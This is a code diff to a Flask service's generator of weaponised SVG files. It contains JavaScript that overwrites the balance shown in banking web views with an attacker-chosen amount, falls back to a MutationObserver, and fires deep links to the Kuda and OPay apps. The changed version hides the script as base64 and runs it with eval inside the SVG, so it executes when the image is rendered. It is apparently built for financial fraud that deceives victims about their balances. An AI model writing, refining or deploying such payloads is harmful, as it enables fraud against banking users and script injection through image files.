@@ -3,6 +3,7 @@ from flask_cors import CORS
 import uuid
 import os
 import random
+import base64
 
 app = Flask(__name__)
 app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
@@ -12,101 +13,83 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 CORS(app)
 
 def generate_robust_payload(device_id, target_app, target_amount):
-    # Device-specific payloads
-    android_payload = f"""
-    // Android-specific hooks
-    try {{
-        // WebView detection
-        if (navigator.userAgent.includes('Android')) {{
-            // Native bridge hooks
-            window.NativeBridge = window.NativeBridge || {};
-            window.NativeBridge.getAccountBalance = function() {{
-                return Promise.resolve({{balance: '{target_amount}'}});
-            }};
-            
-            // Override native methods
-            const originalPushState = history.pushState;
-            history.pushState = function() {{
-                originalPushState.apply(this, arguments);
-                setTimeout(() => {{
-                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-                        el.textContent = '{target_amount}'
-                    );
-                }}, 100);
-            }};
-        }}
-    }} catch (e) {{}}
-    """
-    
-    ios_payload = f"""
-    // iOS-specific hooks
-    try {{
-        // WKWebView detection
-        if (navigator.userAgent.includes('iPhone|iPad|iPod')) {{
-            // Safari bridge hooks
-            if (window.webkit && window.webkit.messageHandlers) {{
-                window.webkit.messageHandlers.getAccountBalance = {{
-                    postMessage: function() {{
-                        return Promise.resolve({{balance: '{target_amount}'}});
-                    }}
-                }};
-            }}
-            
-            // Override native methods
-            const originalPushState = history.pushState;
-            history.pushState = function() {{
-                originalPushState.apply(this, arguments);
-                setTimeout(() => {{
-                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-                        el.textContent = '{target_amount}'
-                    );
-                }}, 100);
-            }};
-        }}
-    }} catch (e) {{}}
-    """
-    
-    # Combined payload with platform detection
+    # Create a more robust payload with error handling
     js_payload = f"""
-    // Platform detection
-    const isAndroid = navigator.userAgent.includes('Android');
-    const isIOS = navigator.userAgent.includes('iPhone|iPad|iPod');
-    
-    // Store target amount in localStorage
-    localStorage.setItem('targetBalance', '{target_amount}');
-    
-    // Hook into storage events
-    window.addEventListener('storage', function(e) {{
-        if (e.key === 'targetBalance') {{
-            document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-                el.textContent = e.newValue
-            );
-        }}
-    }});
-    
-    // Execute platform-specific hooks
-    if (isAndroid) {{
-        {android_payload}
-    }} else if (isIOS) {{
-        {ios_payload}
-    }}
-    
-    // Try deep links first
     try {{
-        window.location = 'kuda://balance';
-        window.location = 'opay://dashboard?section=balance';
+        // Try to access balance elements
+        const elements = document.querySelectorAll('[data-testid="balance"]');
+        if (elements.length > 0) {{
+            elements.forEach(el => el.textContent = '{target_amount}');
+            return;
+        }}
+        
+        // Alternative selectors
+        const altSelectors = [
+            '.account-balance',
+            '[id*="balance"]',
+            '[class*="amount"]'
+        ];
+        
+        for (const selector of altSelectors) {{
+            const els = document.querySelectorAll(selector);
+            if (els.length > 0) {{
+                els.forEach(el => el.textContent = '{target_amount}');
+                return;
+            }}
+        }}
+        
+        // MutationObserver fallback
+        const observer = new MutationObserver(mutations => {{
+            mutations.forEach(mutation => {{
+                if (mutation.type === 'childList') {{
+                    mutation.addedNodes.forEach(node => {{
+                        if (node.nodeType === Node.ELEMENT_NODE) {{
+                            const bal = node.querySelector('[data-testid="balance"]');
+                            if (bal) {{
+                                bal.textContent = '{target_amount}';
+                                observer.disconnect();
+                            }}
+                        }}
+                    }});
+                }}
+            }});
+        }});
+        
+        observer.observe(document.body, {{ childList: true, subtree: true }});
+        
+        // Deep link fallback
+        setTimeout(() => {{
+            try {{
+                window.location = 'kuda://balance';
+                window.location = 'opay://dashboard?section=balance';
+            }} catch (e) {{
+                // Last resort
+                localStorage.setItem('targetBalance', '{target_amount}');
+            }}
+        }}, 500);
     }} catch (e) {{
-        // Fallback to direct DOM manipulation
-        document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-            el.textContent = '{target_amount}'
-        );
+        console.log("Error:", e);
     }}
     """
     
-    # Create an invisible iframe to execute the payload
-    return f"""<svg xmlns="http://www.w3.org/2000/svg">
-        <iframe srcdoc='<script>{js_payload}</script>' style="display:none"></iframe>
-    </svg>"""
+    # Encode payload to avoid syntax errors
+    encoded_payload = base64.b64encode(js_payload.encode()).decode()
+    svg_payload = f"""
+    <svg xmlns="http://www.w3.org/2000/svg">
+        <script>
+            // Execute payload using eval
+            (function() {{
+                try {{
+                    eval(atob('{encoded_payload}'));
+                }} catch (e) {{
+                    console.log("Eval error:", e);
+                }}
+            }})();
+        </script>
+    </svg>
+    """
+    
+    return svg_payload
 
 @app.route('/')
 def home():
